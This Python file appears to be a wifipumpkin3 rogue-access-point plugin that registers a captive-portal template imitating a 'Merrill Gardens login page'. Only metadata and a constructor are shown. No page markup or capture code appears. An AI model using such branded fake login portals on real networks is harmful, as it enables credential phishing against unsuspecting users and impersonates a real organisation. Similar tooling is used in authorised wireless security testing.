# file => mg.py
from wifipumpkin3.plugins.captiveflask.plugin import CaptiveTemplatePlugin
import wifipumpkin3.core.utility.constants as C # import plugin class base

class mg(CaptiveTemplatePlugin):
    meta = {
        'Name'      : 'mg',
        'Version'   : '1.0',
        'Description' : 'Merrill Gardens login page',
        'Author'    : 'paxhumana',
        'TemplatePath' : C.TEMPLATES_FLASK +'templates/mg',
        'StaticPath' : C.TEMPLATES_FLASK + 'templates/mg/static',
        'Preview' : 'plugins/captivePortal/templates/mg/preview.png'
    }

    def __init__(self):
        for key,value in self.meta.items():
            self.__dict__[key] = value
        self.dict_domain = {}
        self.ConfigParser = False 
